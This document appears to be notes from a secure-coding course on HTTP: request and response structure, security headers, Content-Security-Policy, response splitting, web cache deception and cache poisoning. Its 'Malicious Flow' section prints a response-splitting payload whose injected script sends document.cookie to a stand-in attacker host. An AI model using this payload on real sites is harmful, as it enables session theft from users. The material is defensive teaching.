Non-HTTP protocol related vulnerabilites:
* XSS
* Clickjacking
* Man-in-The-Middle

HTTP is a stateless application level protocol for distributed, collaborative, hypertext information systems.

Working OSI (Open Systems Interconnection) Model:
1. Physical Layer
2. Data Link Layer
3. Network Layer
4. Transport Layer
5. Session Layer
6. Presentation Layer
7. Application Layer

### Sample GET Request
```
GET /courses HTTP/1.1
Host: codebashing.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36
Referer: https://codebashing.com/
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ru;q=0.8
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Connection: close
```
* GET is an HTTP verb used to retrieve data from a server
* `/courses` is a path where the desired data resides
* `HTTP/1.1` is the HTTP protocol version that is used for communication
* `HOST` header specifies the requested hostname (authority part of the URL).
* `User-Agent` header describes the software used to make a request.
* `Referer` header contains a previous page visited by the user.
* `Accept` and `Accept-*` headers specify the type of the content, language, encoding, etc. that a client understands
* `Cache-control` header defines cache mechanism behavior
* `Upgrade-Insecure-Requests` header shows to the server that the client prefers encrypted communications
* `Connection` header defines whether the network connection should stay open

### Sample GET Response
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Server: nginx/1.11.9
X-Frame-Options: ALLOW-FROM https://academy.checkmarx.net
ETag: W/"8ca5dd4f507a4295e629491c"
Cache-Control: max-age=0, private, must-revalidate
Set-Cookie: trackingCookie=user1357272
X-Request-Id: 295e586f-7cab-4530-b5cb-1c
X-Runtime: 0.2243
Connection: close
Content-Length: 8576
<!DOCTYPE html>
<-- Web Page content -->
```
* `Content-Type` header defines the type of content that resides in the response body
* `Server` header describes the software that is running on the server side
* `X-Frame-Options` defines domains that can open pages from the current domain in the or similar HTML tags
* `ETag` and `Cache-Control` headers are used to manage caching.
* `Set-Cookie` header instructs the user-agent to save header directives as cookies.
* `X-Request-Id` and `X-Runtime` are custom headers that are specific to the application or environment where the application is hosted.
* `Connection` header defines whether the network connection should stay open.
* `Content-Length` defines the length of the response body.

### Sample POST Request
```
POST /login HTTP/1.1
Host: www.lotsofgoods.me
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36
Referer: https://codebashing.com/
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 46
login=alice&password=correcthorsebatterystaple
```
* `POST` is an HTTP verb used to send data to the server and change the application state
* `/login` is the URL path

### Sample HTTP POST Response
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Server: nginx/1.11.9
ETag: W/"d18a59b032422092a1daaccd9b46bbf4"
Cache-Control: max-age=0, private, must-revalidate
Set-Cookie: sessionid=26161af57b9de30f9b67d16be83700113f8742a136c26d3d2e90b677b85934fe
Connection: close
Content-Length: 1467
<!DOCTYPE html>
<-- Web Page content -->
```

### HTTP Security Headers
Once implemented, HTTP security headers restrict modern browsers from running into easily preventable vulnerabilities. They also provide yet another, additional layer of security by helping to mitigate security vulnerabilities and prevent attacks (like XSS, Clickjacking, information leakage, etc.). But it is important to mention that HTTP security headers are not intended to replace proper, secure code.
```
HTTP/1.1 200 OK
Date: Thu, 21 Mar 2019 09:05:07 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: close
Cache-Control: max-age=600
Content-Security-Policy: script-src 'self' *.codebashing.com 'unsafe-inline' 'unsafe-eval'  www.google-analytics.com; img-src 'self' *.codebashing.com
Expires: Thu, 21 Mar 2019 09:15:06 GMT
Location: https://codebashing.com
strict-transport-security: max-age=31536000
Vary: Accept-Language, Accept-Encoding
x-content-type-options: nosniff
X-Frame-Options: DENY
X-Robots-Tag: noodp
x-xss-protection: 1; mode=block
```

HTTP Strict Transport Security (HSTS) is a mechanism that prevents user-agents (a browser or any kind of program designed for communication with a particular server) from browsing a website via an unencrypted connection in case an encrypted connection can be established, and only using a trusted certificate.

If the request is communicated through an unencrypted channel, it can be captured and tampered with by an attacker. The attacker then can steal or modify any information transmitted between the client and the server or redirect the user to a phishing website. So, the first goal of HSTS is to ensure traffic is encrypted, so it instructs the browser to always use HTTPS instead of HTTP.

Usually, browsers allow users to ignore TLS errors and continue browsing potentially insecure websites. With HSTS enabled, the user will be unable to skip the browser warning and continue. The second important goal of HSTS is to make sure that the traffic is encrypted using a trusted and valid certificate.

### HTTP STRICT TRANSPORT SECURITY
When HSTS response header signals the browser that the certain domain must be requested only using HTTPS, the browser saves this domain to the HSTS list and keeps it there for the timeframe specified in max-age directive of the Strict-Transport-Security header.
There are two cases when HSTS doesn't provide proper protection:
* when the user hasn't browsed to the website before and is making his very first request to this website over HTTP,
* when existing HSTS data has already expired.

To resolve this, it is possible to have a domain included in the HSTS preload list which arrives baked into most modern browsers.

### X-XSS-PROTECTION
Some modern browsers have built-in XSS protection mechanisms that can be used as an additional layer of security against Reflected XSS. The main problem with that is that all of the browsers implement built-in XSS filtering differently, so to add more control to the process and make sure that the loading of a page with the malicious content will be blocked, the X-XSS-Protection header is needed.

X-XSS-Protection header is an optional HTTP header that performs XSS filtering by defining the anti-XSS mechanism behavior: from sanitizing the page by blocking injected Javascript to preventing page rendering and reporting the violation.

By default, browsers that support XSS filtering have it enabled. Though it can be disabled, this is considered a bad practice; often, if an application requires XSS protection to be disabled in order to function properly, it is an indication that the application is quite likely vulnerable to XSS.

Please note that only using the X-XSS-Protection header will not protect your application from XSS, but this header will make an important input in your defense-in-depth strategy and make it more robust.

### X-FRAME-OPTIONS
X-Frame-Options header a defines if the webpage can be rendered inside an <iframe>, <frame>, <applet>, <embed> or <object> tags. Depending on the directive, this header either specifies the list of domains that can embed the webpage, or allows the page to be embedded only inside pages of the same origin, or totally prohibits embedding of a webpage.

The main purpose of the X-Frame-Options header is to protect against Clickjacking. Clickjacking is an attack when the vulnerable page is loaded in a frame inside the malicious page, and the users are tricked into interaction with buttons and other clickable UI elements (e.g. unknowingly clicking "likes" or downloading malicious files) of a vulnerable page without their knowledge.

(Note that setting X-Frame-Options with <meta> HTML tag inside a webpage doesn't work. Use HTTP headers to set it.)

In the right pane, you can see a screenshot of the webpage where the content of another page was denied to be displayed in a frame because the X-Frame-Options header disallowed the browser from doing so with a deny directive.

### X-FRAME-OPTIONS AND CONTENT-SECURITY-POLICY
X-Frame-Options is also covered by Content-Security-Policy (CSP). CSP is a suite of headers with security directives for multiple uses (which will be covered in their own lesson). Among these security directives is the frame-ancestorsdirective which pursues the same goal as the X-Frame-Options header. The main difference between them is the implementation of the SAMEORIGIN directive of the X-Frame-Options header.

Various user-agents interpret SAMEORIGIN directive in a different way, and some of them only check the top-level domain. Whereas with the CSP's frame-ancestors directive, the whole chain of origins is checked. (The example of the chain of origins is an iframe inside an iframe, inside an iframe, and so on.)

The CSP W3C recommendation states that with the CSP frame-ancestors directive being introduced, the X-Frame-Options header becomes obsolete. Thus CSP should be used to prevent Clickjacking in the first place and the X-Frame-Options header should be used for backward compatibility with browsers that don't support this CSP directive.

### HTTP Version
When HTTP v1.1 is used in HTTP requests, it presents them in a human-readable format. HTTP v2 requests are binary and require special tools to be read. The main difference between v1.1. and v2 is the way requests and responses are transmitted: HTTP2 is aimed at decreasing the time required for data transfer.

```
GET /courses HTTP/1.1
Host: codebashing.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36
Origin: https://codebashing.com
Referer: https://codebashing.com/dashboard
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ru;q=0.8
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Cookie: sessionid=b3cd288f3e3d499ca8e45fbae696f7b5
Connection: close
```

```
HTTP/1.1 200 OK
Date: Sat, 08 March 2019 12:33:14 GMT
Server: nginx/1.11.9
X-Frame-Options: ALLOW-FROM https://academy.checkmarx.net
ETag: W/"8ca5dd4f507a4295e629491c"
Cache-Control: max-age=0, private, must-revalidate
Set-Cookie: trackingCookie=user135727
X-Request-Id: 295e586f-7cab-4530-b5cb-1c
X-Runtime: 0.2243
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 8576
<!DOCTYPE html>
<-- Web Page content -->
```

### HTTP Request Methods
In HTTP v1.1 and v2 the following methods are used for different purposes: GET, POST, HEAD, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH.

The most used of them are GET and POST methods.

GET method is used to retrieve data from a server. GET requests are read-only (according to the HTTP RFC, they should not change the application state but in real life they sometimes do) and do not have a body.

POST requests are used to change the application state and have a body.

Using GET for state-changing operations can lead to CSRF and information disclosure. First, because GET request doesn’t have a body, all the information is sent in an URL, and the URL can be disclosed in intermediate devices. Second, for POST requests, there is built-in protection against CSRF in all modern frameworks, but for GET requests, it depends on the framework, whether or not it has built-in CSRF protection for them.

Description of other HTTP methods could be found under the following links:

https://tools.ietf.org/html/rfc7231 and https://tools.ietf.org/html/rfc5789

```
POST /login HTTP/1.1
Host: lotsofgoods.me
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36
Origin: https://codebashing.com
Referer: https://codebashing.com/courses
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Cookie: sessionid=55fc9da99a9d425c8ec8c597fd5bec61
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Connection: close
login=alice&password=correcthorsebatterystaple
```

```
GET /courses HTTP/1.1
Host: codebashing.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36
Origin: https://codebashing.com
Referer: https://codebashing.com/dashboard
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ru;q=0.8
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Cookie:sessionid=b3cd288f3e3d499ca8e45fbae696f7b5
Connection: close
```

### URL Structure
URLs are used to locate resources on the Internet. Let’s take a look at the URL structure that is used with HTTP (for other protocols, URL format may differ).
`scheme://authority/path?query#fragment`

### Get Request Headers
In HTTP requests and responses, the following types of headers are used:
* Request
* Response
* Entity
* General
* Custom application defined
The complete list of HTTP headers can be found in HTTP RFCs.

### Host
This header is used to route through the different applications hosted on the same IP address. Note that the Host header is completely under the user control (so, do not use its value for security checks).

### User-Agent
This header is used by the server to define the user's client application and to serve the correct version of the requested web page. This header can be easily manipulated (e.g. some browser plug-in could change user-agent to an arbitrary value), so it shouldn't be used for security checks.

### Referer
This header shows the address of the previous web page where the user clicked the link to the requested page. Referer header contains the full URL of the previous page, so if there is sensitive data in that URL, then it could be disclosed through this header. Referer header is completely under the user control, so do not use its value for security checks.

### Accept, Accept-*
This group of headers defines what encoding, language, content type the client can understand.

### Upgrade-Insecure-Requests
This header sends a signal to the server expressing the client’s preference for an encrypted and authenticated response.

### Connection
This header controls whether or not the network connection stays open after the current transaction finishes.

### HTTP Cookies
An HTTP cookie is a small piece of data that a server sends to a client. The server sends the cookie using the Set-Cookie header in the response. It looks like that:

Set-Cookie: trackingCookie=user1357272

User-agent saves a cookie from the response and sends it back in the Cookie request header like that:

Cookie: trackingCookie=user1357272

Cookies are used for the following purposes:

1. Session management

HTTP is a stateless protocol meaning that two requests cannot be correlated to the same source or to each other even if they are sent from the same IP address and contain the same user-agent. In other words, without some additional information, the server is not able to understand that two requests were sent consequently by the same user.

To keep the flow of all the user's requests, session identifiers are used. Usually, a session identifier resides in a cookie and is sent with every request in the Cookie header. Thus the server can track all actions the user makes, display him the right interface, and send responses with correct data

2. Personalization

Sometimes cookies are used to store user preferences and non-sensitive application data.

3. Tracking

Nowadays many companies try to understand their users' behavior and track all the actions users make. Cookies can be used for this purpose as they can persist in the browser, until cleared, and can be tied to the user behavior, even if the user is not authenticated.

### Response Status Codes
And now let us look at the response. Near the HTTP version, we can see the response code (200 OK in our example).

There are five groups of response status codes with the corresponding status message. Let us review these groups and look at the most popular status codes.

Successful responses

200 – OK

This status shows that the request has succeeded. Either the desired information exists on the server and is transmitted in the response body, or the desired application state change has been performed successfully.

Redirection responses

301 – Moved permanently

The status means that the desired resource resides at another location (which is usually specified in the Location header of the response).

302 – Found

The status also means that the desired page has been moved and a new location is specified in the Location header of the response. But in this case, the page has been moved temporarily.

304 – Not Modified

This code is used to instruct the browser to used cached data because it hasn’t changed since the previous request.

Client error responses

400 – Bad Request

This status means that the request syntax is invalid and the server was not able to process it.

401 – Unauthorized

This status means that the requested resource requires a client to be authenticated.

403 – Forbidden

This status means that the authenticated user does not have permissions to access the requested resource.

404 – Not Found

This code shows that the requested resource does not exist on the server.

Server error responses

500 – Internal Server Error

This code means that the request syntax is correct, but the server could not prepare a response for the request due to an exception thrown by the application code.


### HTTP Headers that are misused for security purposes
You should NEVER use the following headers in implementations of security mechanisms:
Host
Referer

### Content-Type Header
The Content-Type header is not actually a security header, and content type validation cannot be treated as a standalone security mechanism. But it is definitely an important part of the defense-in-depth strategy.

By setting Content-Type in request and response headers, the programmer can manipulate the way the server will interpret the body of the corresponding HTTP request or response. If the server doesn't check the content header value, it leaves a possibility for an attacker to manipulate the application's behavior by tampering with the Content-Type header content.

In the right pane, there is an example of a JQuery vulnerability that is based on the missing Content-type header.

In versions prior to 3.0.0, JQuery automatically evaluates the response body if response Content-Type header is text/javascript for cross-domain requests.

If the datatype is not specified in $.get(), then the method doesn’t wait for a specific type of content and processes any kind of content received in response. If the content is javascript, it is automatically evaluated.

The vulnerability was mitigated by implementing content type validation: if an application does not expect javascript in the response, then it is not executed.

### X-CONTENT-TYPE-OPTIONS
When the user agent (usually, a browser) is trying to guess the content type, it is called MIME sniffing. This feature can be abused by an attacker and the browser can be tricked into interpreting malicious data, for example, in an XSS attack.

In HTTP response, there is an X-Content-Type-Options header that has a single nosniff directive. It indicates that the user agent should not perform MIME sniffing and should treat the body content as the content of the type specified in the Content-Type header.

X-Content-Type-Options is also not a security header, but together with Content-Type, they make a valuable input into the defense-in-depth strategy. Don't let the user agent guess the content type, because missing content type check can lead to the execution of content that should not be executed, or to a security controls bypass.

### Referer
Referer header contains the address of the webpage that sent the HTTP request. It's is set by the browser and cannot be set using Javascript.

The major security considerations about the Referer header is that even though it's set by the browser and cannot be manipulated using the Javascript, the header content must not be used for making security-related and business logic-related decisions. It can be manipulated by an attacker as any other part of the HTTP request, thus making all the security mechanisms based on the Referer header check flawed by design.

### REFERER AND REFERER-POLICY HEADERS
The Referer header usually contains the full URL of the page that initiated the request. If the URL contains sensitive data, then ordinary legitimate requests to analytical systems or image storages disclose that data from the URL. To prevent this, one must avoid storing sensitive data in the URL and use Referrer-Policy header, rel or referrerpolicy HTML tag attributes.

The Referrer-Policy header instructs user agents which referrer information, sent in the Referer header, should be added to the request. In other words, Referrer-Policy is an additional control that ensures that sensitive data doesn't leak from the Referer header.

HTML tag attributes enable similar behavior but apply it to a specific tag.

### Host
The Host header specifies which website or a web application hosted on the same web server (with the same IP address) should process an incoming HTTP request. It contains the domain name of the server, and (optionally) the TCP port number on which the server is listening. This header is set by the browser and cannot be modified using Javascript.

Even though Host header is set by browsers and cannot be manipulated using Javascript, its content must not be used for making security-related and business logic-related decisions. The header content (as any other part of the HTTP request) can be manipulated by an attacker, and that makes mechanisms based on the Host header check flawed by design.

In the right pane, you can see an example of a business logic-related decision that relies on the information from the Host header of the incoming request.

### Malicious Flow
Bob is a hacker. While he was scanning the application for vulnerabilities, he noticed that the server puts the location information in the cookie as is. If the location value is not sanitized, then this looks like a great chance to perform the HTTP Response Splitting attack.
Bob crafts the malicious payload that will trick the server into sending the page that contains a cookie-stealing script:
Cyberville\r\nContent-length: 113\r\n\r\n<script>document.write("<img src='https://www.bobsevilserver.com/catch?cookie="+document.cookie+" '/>");</script>
Then he puts it into the intercepted GET request instead of the legitimate payload.

HTTP Response Splitting was used to trick the server into returning the malicious payload as a legitimate webpage in the response. This is achieved by using \r\n combination of symbols to make the server interpret it as a line break and to insert the malicious page content over the legitimate one.

Cache Poisoning happened when that malicious response was saved in cache and then served to users in response to their ordinary requests.

In the right pane, there are two examples of how the \r\n combination can be used to:

insert an arbitrary custom header (e.g. to bypass some security control)
insert a new Content-Length header and a response body for the XSS or defacement attack
Each time you develop some new request parsing logic on your web server, make sure you filter out \r\n combination of symbols (or each of them separately) to prevent HTTP Response Splitting.

### CSP
Content-Security-Policy (CSP) is a special HTTP response header that tells the browser what are the safe sources of the content for the page it is going to load.

When those safe sources are specified, it prevents the hacker from tricking the browser into loading and running malicious scripts in the user’s browser, injecting iframes with some malicious or unauthorized content, displaying fake images or basically injecting anything from a remote untrusted domain.

CSP can also be used to ensure that all the content is loaded via HTTPS, and it also prevents Clickjacking by instructing the browser that it shouldn't allow the certain page to be loaded in an iframe.

```http
Content-Security-Policy: script-src 'strict-dynamic' 'nonce-RandomValue' 'unsafe-inline' http: https:https://codebashing.com; object-src 'none';
```

What this policy does:

It allows all scripts that have the RandomValue nonce specified and propagates the trust to all the scripts loaded by these scripts;

It will ignore scripts from https://codebashing.com unless they have the nonce specified;

It specifies the schemas that may be used to retrieve the scripts: http or https;

It disallows objects that can be used to execute JavaScript like <object >, <embed > or <applet > tags.

### CSP Precautions
As we've just learned, Content-Security-Policy header instructs the browser which sources of scripts (and other content) are trusted, and the browser runs only those scripts that were taken from those trusted sources and ignores all the inline scripts and HTML event attributes (unless it's instructed otherwise).

It is important to emphasize:

CSP doesn't prevent the injection of malicious scripts itself. Those scripts can be injected by some hacker. But they will not run, because CSP will instruct the browser to execute only the scripts taken from the trusted sources specified in the policy.

So CSP shouldn’t be used as the only security control to prevent XSS or injection of malicious content. It should be used as a part of the defense-in-depth strategy against XSS and other vulnerabilities.

```http
Content-Security-Policy: script-src https://codebashing.com unsafe-inline' 'unsafe-eval'; img-src * ; default-src 'self'
```

What does this policy do?

It allows scripts loaded from https://codebashing.com

It allows script from inline resources

It allows usage of eval() and similar unsafe JavaScript methods

It allows images from any source

When the type of content is not specified, it falls back to the default policy that allows content loaded from the current origin.

### CSP CONFIGURATION NOTES
It is important to mention that the Content Security Policy must be thoroughly tested prior to the implementation in the production environment. CSP misconfiguration can easily break the application's functionality and ruin the user experience.

A misconfigured CSP is likely to be loosened or turned off, and a loosened CSP in most cases is as insecure as a missing CSP.

### CSP VERSIONS
CSP is constantly evolving. The current version of CSP is "level 2". "Level 3" version of it exists but it is still in a draft, nevertheless modern browsers support most of it. (CSP header can be not compatible with old browsers. Browsers that don’t support CSP just ignore the CSP header.)

### CSP DIRECTIVES TYPE: FETCH
This set of directives controls locations used to load different types of resources.

Please note that in order to mitigate XSS, you should define either default-src and script-src directives or object-src and script-src directives.

The default-src directive defines a default source of content for the webpage. It is used as a fallback when a specific directive is not defined. All fetch directives fall back to default-src if they are not defined.

This directive defines sources for <object>, <embed> and <applet> tags. Note that using these tags allows for arbitrary javascript execution, so it must be included into the policy in order to prevent XSS.

This directive defines sources of JavaScript like <script>, javascript:, eval(), etc.

It should be configured carefully because misconfiguration usually leaves an opportunity to bypass CSP.

The directive allows more granular configuration using keywords. Note that these keywords turn off some security features leaving CSP bypassable.

This directive is deprecated in CSP Level 3. Usage of frame-src and worker-src is recommended instead.

The directive defines sources for web workers and nested browsing contexts loaded using <iframe> or <frame> tags.

The directive restricts usage of XMLHttpRequests, Fetch, WebSockets, EventSource and <a ping=”URL”>, only the URLs specified in the policy can be loaded using methods mentioned previously.

frame-src

The directive specifies valid sources for nested browsing context using <iframe> or <frame>.


font-src

The directive specifies sources of fonts.

img-src

The directive specifies sources of images.

manifest-src

The directive specifies sources of a web application manifest.


media-src

The directive specifies sources of media loaded in <audio> or <video> tags.

prefetch-src

The directive specifies the URL from which resources can be prefetched or pre-rendered.

style-src

The directive specifies sources of style sheets.

worker-src

The directive specifies sources of web workers.


unsafe-inline

Without this keyword, CSP will trust only scripts loaded from the specified resources. It won't permit inline scripts residing on the webpage between <script>, <style> tags, in javascript: and event handlers.

This keyword allows inline script sources and thus removes the protection against XSS that CSP provides.

If there is no possible way to avoid using inline javascript, then nonce or hash source should be used.


unsafe-eval

This keyword allows usage of functions that evaluate code presented as a string, e.g. eval(), Function(), etc.

strict-dynamic

This keyword is used with a nonce or hash source, e.g. script-src ‘strict-dynamic’ ‘nonce-RandomValue’ or script-src ‘strict-dynamic’ ‘sha-256-base64EncodedHash’.

The nonce received in the header should be a part of <script>, e.g. <script nonce=”RandomValue” src=”script URL”>, thus the browser understands that this script is trusted and can be executed.

The hash received in the header is the base64 representation of a sha256 (384 or 512) hash of the script.

default-src

The default-src directive defines a default source of content for the webpage. It is used as a fallback when a specific directive is not defined. All fetch directives fall back to default-src if they are not defined.

object-src

This directive defines sources for <object>, <embed> and <applet> tags. Note that using these tags allows for arbitrary javascript execution, so it must be included into the policy in order to prevent XSS.


script-src

This directive defines sources of JavaScript like <script>, javascript:, eval(), etc.

It should be configured carefully because misconfiguration usually leaves an opportunity to bypass CSP.

The directive allows more granular configuration using keywords. Note that these keywords turn off some security features leaving CSP bypassable.


child-src

This directive is deprecated in CSP Level 3. Usage of frame-src and worker-src is recommended instead.

The directive defines sources for web workers and nested browsing contexts loaded using <iframe> or <frame> tags.


connect-src

The directive restricts usage of XMLHttpRequests, Fetch, WebSockets, EventSource and <a ping=”URL”>, only the URLs specified in the policy can be loaded using methods mentioned previously.

### CSP DIRECTIVES TYPE: DOCUMENT
These directives control the properties of a document or worker environment to which a content security policy applies.

In the right pane, click the directive you want to explore, and the description will appear instantly.

base-uri

The directive restricts the URLs that can be used in <base> element which defines the base URLs to be prepended to relative URLs used in the page.

plugin-types

The directives defines types of plug-ins used in <embed>, <object>, <applet> tags, e.g. flash objects or java applets.

sandbox

The directive applies a sandbox attribute to the current page. It behaves like a sandbox attribute used in <iframe> allowing to restrict execution of scripts and plug-ins, block pop-ups, etc.


disown-opener

The directive instructs a browser to set window.opener object to null when the user is navigated from a CSP-protected page to a new tab or window. Check out the Reverse Tabnabbing lesson to understand what purpose this directive serves.

Note that the directive is not finalized; alternative security controls should be used.

### CSP DIRECTIVES TYPE: NAVIGATION
These directives restrict URLs that are used to navigate the user from the current page using different HTML tags.

form-action

The directive specifies the URLs that can be used as targets of form submission, e.g. targetURL in <form action=”targetURL” method=”post”>.


frame-ancestors

The directive specifies sources that may open the page in <iframe>, <frame>, <applet>, <object> and <embed> tags.

The directive partially overlaps with the X-FRAME-OPTIONS HTTP header and serves the same purpose.

Check Clickjacking lesson to learn more about X_FRAME_OPTIONS and frame-ancestors.

navigate-to

The directive restricts the URLs to which document can initiate navigation using any navigation means.

Note that the directive is a part of CSP level 3, thus it is not published yet. There also can be support issues among browsers.

### CSP DIRECTIVES TYPE: REPORTING
To make the CSP configuration process easier, one can use a reporting functionality that is built into the CSP (it works according to the reporting API specification at https://w3c.github.io/reporting/).

Location of report collection service can be set using report-to or report-uri directives. Also, CSP has a report-only mode that should be used for testing CSP settings. The report-only mode is activated by using Content-Security-Policy-Report-Only header.

report-to

This directive specifies a reporting group that should be used to send reports. Reporting groups are set in Report-To response header. Reporting group is created according to the reporting API (https://w3c.github.io/reporting/).

report-uri

This directive specifies the URL that the user-agent should use to report CSP violation.

Note that this directive is deprecated in CSP level 3 and the usage of Report-To is recommended.

Currently, Report-To is not widely supported by browsers, thus the usage of both directives is recommended for the backward compatibility. If Report-To is presented and supported by the browser, then report-uri directive is ignored.

### CSP DIRECTIVES TYPE: OTHER
block-all-mixed-content

This directive prevents loading of any page components via HTTP if the page is loaded via HTTPS.


require-sri-for

This directive makes subresource integrity (SRI) usage mandatory for scripts or/and style sheets. For example, SRI allows to specify a loaded script hash and to check that script hasn’t changed.


upgrade-insecure-requests

This directive instructs the user-agent to upgrade non-navigational requests from HTTP to HTTPS.

### CSP TIPS
So, how to configure the effective Content Security Policy? We have some tips for you:

1. CSP should restrict at least sources of scripts and objects.

2. Use a whitelist of specific scripts containing the nonce specified in the policy or compare the script hash with the hash specified in the policy.

3. Avoid using unsafe-inline and unsafe-eval or at least use them with a nonce or a hash.

4. Test your policy before going to production.

5. Use CSP only in the report-only mode for a pilot run on production.

### Web Cache Deception
Web Cache Deception is another technique for attacking caches. It's different from the HTTP Cache Poisoning attack because no tainted data is saved in the cache and then served to users (which is what Cache Poisoning implies). During the Web Cache Deception attack, a malicious user gains unauthorized access to sensitive data of another user by exploiting ordinary cache behavior.

The following conditions should be met for the attack to succeed:

1. The web server returns the contents of the "root" page (https://codebashing.com/home/) when a nonexistent static file (like https://codebashing.com/home/somecss.css) is requested. (In other words, the URL is rewritten from route /home/somecss.css to /home/.)

2. Web cache disregards HTTP headers that define caching behavior and relies on file extensions (in our example - a CSS file).

3. A victim is authenticated while accessing a malicious URL.

The vulnerable application pane loads the online shopping application LotsOfGoods.me. It aggregates data from multiple off-line shops and presents it on a single platform. The user can buy goods from all those sellers right from the application.

So, let us quickly recap what had happened during the attack.

1. Bob lured the authenticated user (Alice) on a page with a nonexistent static resource (a CSS file in our case: https://lotsofgoods.me/myaccount/profile/revieworder.css).

2. The web server returned the contents of https://lotsofgoods.me/myaccount/profile/ page ignoring the filename and its extension.

3. Web cache disregarded HTTP headers that define caching behavior and cached the returned page (with all sensitive data of the logged on user) as a static file, based on its extension.

4. As a result, a subsequent request of the attacker to the https://lotsofgoods.me/myaccount/profile/revieworder.css showed the response for https://lotsofgoods.me/myaccount/profile/ with user's sensitive data.

To prevent Web Cache Deception, make sure the following conditions are met:

1. Only static content is cached, and it is separated from the rest of the content.

2. In case a non-existent page (or file) is requested, 404 page is returned or a redirect to the home page is performed using the HTTP 302 response code.

3. Caching directives from HTTP headers are taken into consideration and not ignored.


### HTTP CACHING
Caching is a mechanism designed to decrease the server load and speed up the loading of web pages. A cache saves copies of server responses and serves them to users upon their repeating requests.

The cache can operate locally in the user’s browser, or there are also intermediate caches: caching proxies, load balancers, CDNs, web servers. Our lesson is devoted specifically to intermediate caches.

In case of a browser cache, when a user requests some data, the browser first checks if the requested data is cached and not expired, then the cache serves the user the cached version of data. In case of an intermediate cache, the same logic is applied: first, the cache checks if the requested data is saved and not expired, and then serves it to users. It also allows serving data when the server is down.

Usually static content like images, stylesheets, or scripts is cached.

### CACHING HEADERS
Also, every cache provider has its own caching preferences and capabilities. To enable them, custom headers (that are specific to a certain cache provider) can be used. Those custom headers start with "X-" (like "X-Some-Header").

These headers are not a part of the HTTP standard and thus can be treated differently by different software.

Cache-Control

This general header defines the behavior of caching mechanisms through directives. Directives allow disabling of caching or fine-tuning of the caching behavior (e.g. specifying what kind of caching providers can cache the response, defining cache storage period, managing usage of the stale cache).

Pragma

This header with the no-cache directive is equal to the Cache-Control: no-cache header. It is used for the backward compatibility with HTTP/1.0 caching mechanisms. The header is not supported by some user agents, thus using Cache-Control header as a reliable caching mechanism is more preferable.

Age

This header specifies the number of seconds a response has been stored in an intermediate cache.

Expires

This header sets the date and time when the ached response becomes expired.

ETag and Precondition headers (If-*)

These headers are used to validate the freshness of cached data. ETag header value stores a version of the resource and If-* headers define additional conditions of ETag verification.

### CACHE KEYS
When a cache receives a request for some resource, it needs to check if it has already saved a copy of this resource and can return it to the user immediately, or it needs to forward the request to the application server.

Identifying whether the user requests the same resource that is already stored in the cache can be tricky. Caches solve this problem by using the concept of cache keys. Some component of the HTTP request can be set as keys (in cache settings).

When a request comes to the cache server, it checks first which headers of that request are keyed. Then it takes all those keyed headers with their values together and calculates the hash. After that this hash is used to search through the cached responses (responses are stored together with hashes of keyed headers of respective requests).

In the right pane, you can see the animated diagram of the cache using keyed headers to calculate the hash for the incoming request and retrieve the correct cached response to the user. Note that it is a simplified description, and it might be not valid for all existing caching software.

### ATTACK INTRODUCED
The general idea of the Cache Poisoning attack is to make the cache save the resource that contains some malicious data and then serve it to users that request this resource. This attack allows performing a further XSS attack, defacing a page, redirecting a user to an arbitrary domain and bypassing access control mechanisms.

In this lesson, we will talk about basic Cache Poisoning using the unkeyed HTTP request components. During this attack, the hacker will send some malicious content in the unkeyed request header, hoping that it will be used in the response, cached and then served to other users of the application requesting the same resource.

### VULNERABLE APPLICATION
The vulnerable application pane loads the online shopping application LotsOfGoods.me. It uses X-Script-Source custom header to pass a domain name to the server, where this name will be used to generate the URL to run the counter script on the page. This header is unkeyed, so the cache doesn't use it for identification purposes.

### VULNERABILITY DETECTED
Bob is a hacker looking for possibilities for an attack on a yet-another shopping application. He is using his Burp Suite Param Miner plug-in against the LotsOfGoods.me application to find out which components (headers, cookies) of the HTTP request are unkeyed. In the scanning results, he sees that there is an unkeyed parameter in the request: X-Script-Source header.

The name of this header implies that it contains some information that allows detecting the path to the folder that contains scripts, and this path is probably used somewhere in the code of the page.

### VULNERABILITY TESTED
Bob analyzes the code of the web page and finds out that the domain name passed in the X-Script-Source header is used to create an URL of the counter script that is used on the page. Now Bob needs to test how far he can go with the exploitation of that unkeyed request component.

On his malicious server, he creates the folder structure that is the same as in the legitimate script link and puts there his malicious script that steals user cookies.

